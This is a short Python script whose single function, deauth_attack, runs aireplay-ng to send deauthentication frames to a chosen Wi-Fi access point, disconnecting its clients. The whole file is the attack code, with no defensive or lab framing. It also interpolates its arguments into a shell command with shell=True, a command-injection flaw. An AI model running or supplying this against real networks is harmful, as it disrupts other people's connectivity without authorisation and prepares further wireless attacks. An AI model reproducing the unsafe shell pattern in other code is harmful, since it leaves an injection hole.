import subprocess

def deauth_attack(bssid, interface="wlan0mon"):
    command = f"aireplay-ng --deauth 10 -a {bssid} {interface}"
    subprocess.run(command, shell=True)
